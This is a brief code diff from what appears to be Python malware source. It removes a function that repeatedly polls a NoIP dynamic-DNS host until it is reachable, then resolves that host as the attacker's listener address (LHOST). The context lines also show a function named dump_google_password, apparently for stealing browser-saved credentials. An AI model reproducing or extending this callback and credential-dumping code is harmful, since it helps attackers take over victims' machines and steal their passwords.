@@ -61,19 +61,6 @@ def get_noip_ip_address():
     global LHOST
     LHOST = socket.gethostbyname(NO_IP_HOST)
 
-
-def check_no_ip_online():
-    # Check if NoIP is online, If else dont fire
-    NO_IP_HTTP = "http://" + NO_IP_HOST
-    while True:
-        try:
-            urllib.urlopen(NO_IP_HTTP).getcode()
-        except:
-            time.sleep(10)
-        else:
-            get_noip_ip_address()
-            break
-
 def dump_google_password():
     path = ''
     try:
